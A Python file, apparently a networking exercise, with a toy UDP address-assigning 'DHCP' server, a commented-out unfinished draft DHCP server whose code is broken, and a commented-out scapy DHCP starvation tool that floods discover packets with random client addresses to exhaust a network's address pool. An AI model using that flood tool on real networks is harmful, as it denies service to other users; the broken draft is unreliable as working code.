import socket
import threading


SERVER_IP = '127.0.0.1'
SERVER_PORT = 68
IP_ADDRESS_PREFIX = '192.168.0.'
IP_ADDRESS_SUFFIX = 1

client_ip_map = {}


class server_dhcp:

    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.dns_table = {}
        self.ip = socket.gethostbyname(socket.gethostname())
        self.port = 68
        self.connected = True

    def assign_ip_address(self, client_address):
        global IP_ADDRESS_SUFFIX
        if client_address in client_ip_map:
            print(f'{client_address} already has an IP address of {client_ip_map[client_address]}')
            return client_ip_map[client_address]
        else:
            ip_address = IP_ADDRESS_PREFIX + str(IP_ADDRESS_SUFFIX)
            IP_ADDRESS_SUFFIX += 1
            client_ip_map[client_address] = ip_address
            print(f'{client_address} has been assigned IP address {ip_address}')
            return ip_address

    def run(self):
        self.socket.bind((self.ip, self.port))
        print(f"[LISTENING] Server is listening on IP:{self.ip} PORT:{self.port}")

        while self.connected:
            msg, addr = self.socket.recvfrom(1024)
            if msg.decode() == "discovery":
                new_ip = self.assign_ip_address(addr[0])
                self.socket.sendto(new_ip.encode(),addr)
            elif msg.decode('utf-8') == "ACK":
                print(f"received ack for{addr[0]}")

if __name__ == "__main__":
    server_dhcp().run()










































#######################################################################################################################################
#
# import socket
# import struct
#
#
# class server_dhcp:
#
#     def __init__(self):
#
#
#         # Define the IP address range
#
#         self.ip_start = "192.168.0.100"
#         self.ip_end = "192.168.0.200"
#
#     # Keep track of assigned IP addresses
#         assigned_ips = {}
#
#     # Set up a socket
#         server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
#         server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
#         server_socket.bind(('192.168.0.1', 4455))
#
#     # Listen for DHCPDISCOVER messages
#         while True:
#             message, client_address = server_socket.recvfrom(2048)
#             if message[0] == 1 and message[1] == 1 and message[2] == 6 and message[3] == 0:
#                 # Parse the MAC address from the DHCPDISCOVER message
#                 mac_address = struct.unpack("!6s", message[28:34])[0]
#
#             # Assign an IP address to the client
#             if mac_address in assigned_ips:
#                 ip_address = assigned_ips[mac_address]
#             else:
#                 ip_address = ip_start
#                 while ip_address in assigned_ips:
#                     # Increment the IP address until an available one is found
#                     ip_bytes = list(map(int, ip_address.split(".")))
#                     ip_bytes[3] += 1
#                     if ip_bytes[3] > int(ip_end.split(".")[3]):
#                         # The IP address range has been exhausted
#                         break
#                     ip_address = ".".join(map(str, ip_bytes))
#
#                 if ip_address not in assigned_ips:
#                     assigned_ips[mac_address] = ip_address
#
#             # Send a DHCPOFFER message
#             offer_message = b'\x02\x01\x06\x00' + 236*b'\x00' + b'\x00\x00\x00\x00' + socket.inet_aton(ip_address) + 192*b'\x00'
#             server_socket.sendto(offer_message, ('255.255.255.255', 68))
#
#             # Wait for a DHCPREQUEST message
#             message, client_address = server_socket.recvfrom(2048)
#             if message[0] == 1 and message[1] == 1 and message[2] == 6 and message[3] == 0:
#                 # Send a DHCPACK message
#                 ack_message = b'\x02\x01\x06\x00' + 236*b'\x00' + b'\x00\x00\x00\x00' + socket.inet_aton(ip_address) + 192*b'\x00'
#                 server_socket.sendto()












################################################################################################################
# import argparse
# import logging
# import string

# # Quiet scapy
# logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
#
# from scapy import volatile  # noqa: E402
# from scapy import sendrecv  # noqa: E402
# from scapy import config  # noqa: E402
# from scapy.layers import l2  # noqa: E402
# from scapy.layers import inet  # noqa: E402
# from scapy.layers import dhcp  # noqa: E402
#
# # Configuration requires these imports to properly initialize
# from scapy import route  # noqa: E402, F401
# from scapy import route6  # noqa: E402, F401
#
#
# def dhcp_flood(**kwargs):
#     iface = kwargs["interface"]
#     count = kwargs["count"]
#
#     unique_hexdigits = str.encode("".join(set(string.hexdigits.lower())))
#     packet = (
#         l2.Ether(dst="ff:ff:ff:ff:ff:ff") /
#         inet.IP(src="0.0.0.0", dst="255.255.255.255") /
#         inet.UDP(sport=68, dport=67) /
#         dhcp.BOOTP(chaddr=volatile.RandString(12, unique_hexdigits)) /
#         dhcp.DHCP(options=[("message-type", "discover"), "end"])
#     )
#
#     sendrecv.sendp(
#         packet,
#         iface=iface,
#         count=count
#     )
#
#
# def print_dhcp_response(response):
#     print("Source: {}".format(response[l2.Ether].src))
#     print("Destination: {}".format(response[l2.Ether].dst))
#
#     for option in response[dhcp.DHCP].options:
#         if isinstance(option, tuple):
#             option, *values = option
#         else:
#             # For some reason some options are strings instead of tuples
#             option, *values = option, None
#
#         if option in ["end", "pad"]:
#             break
#
#         output = "Option: {} -> {}".format(option, values)
#
#         if option == "message-type" and len(values) == 1:
#             dhcp_type = dhcp.DHCPTypes.get(values[0], "unknown")
#             output = "{} ({})".format(output, dhcp_type)
#
#         print(output)
#
#
# def dhcp_sniff(**kwargs):
#     sendrecv.sniff(filter="udp and (port 67 or 68)", prn=print_dhcp_response)
#
#
# def parse_args():
#     p = argparse.ArgumentParser(description='''
#         All your IPs are belong to us.
#         ''', formatter_class=argparse.RawTextHelpFormatter)
#
#     p.add_argument(
#         '-i',
#         '--interface',
#         action='store',
#         default=config.conf.iface,
#         help='network interface to use'
#     )
#
#     subparsers = p.add_subparsers(dest='command')
#     subparsers.required = True
#
#     flood = subparsers.add_parser('flood')
#     flood.add_argument(
#         '-c',
#         '--count',
#         action='store',
#         default=10,
#         type=int,
#         help='number of addresses to consume'
#     )
#
#     subparsers.add_parser('sniff')
#
#     args = p.parse_args()
#     return args
#
#
# def main():
#     args = parse_args()
#
#     dispatch = {
#         "flood": dhcp_flood,
#         "sniff": dhcp_sniff,
#     }
#
#     dispatch[args.command](**vars(args))
#
#
# if __name__ == "__main__":
#     main()
